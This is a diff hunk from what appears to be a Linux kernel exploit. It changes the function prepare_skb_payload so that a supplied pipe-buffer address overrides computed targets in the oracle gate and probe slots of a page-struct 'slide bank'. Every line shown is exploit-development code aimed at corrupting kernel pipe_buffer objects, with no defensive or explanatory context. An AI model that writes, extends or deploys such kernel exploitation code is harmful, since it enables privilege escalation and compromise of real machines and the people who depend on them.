@@ -740,8 +740,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
         if (slot == P0_ORACLE_GATE_SLOT) {
           parent = direct_to_page(base);
-          target = pipebuf_page_base +
-                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+          target = pipebuf_addr
+              ? pipebuf_addr
+              : pipebuf_page_base +
+                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
         } else if (slot == P0_ORACLE_PROBE_SLOT) {
           uintptr_t direct_addr =
@@ -820,8 +822,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     p0_gate_page_struct = direct_to_page(base);
     slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
     slide_bank_targets[P0_ORACLE_GATE_SLOT] =
-        pipebuf_page_base +
-        P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+        pipebuf_addr
+            ? pipebuf_addr
+            : pipebuf_page_base +
+                  P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
     slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_gate_page_struct;
     slide_bank_targets[P0_ORACLE_PROBE_SLOT] = 0;
 #elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
@@ -832,12 +836,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
           direct_to_page(fops_data_probe_addr & ~(PAGE_SIZE - 1));
       slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
       slide_bank_targets[P0_ORACLE_GATE_SLOT] =
-          pipebuf_page_base +
-          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+        pipebuf_addr
+            ? pipebuf_addr
+            : pipebuf_page_base +
+                  P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
       slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_probe_page_struct;
       slide_bank_targets[P0_ORACLE_PROBE_SLOT] =
-          pipebuf_page_base +
-          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+          (pipebuf_addr
+              ? pipebuf_addr
+              : pipebuf_page_base +
+                    P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE) +
           sizeof(struct user_pipe_buffer);
       slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] =
           p0_gate_page_struct;
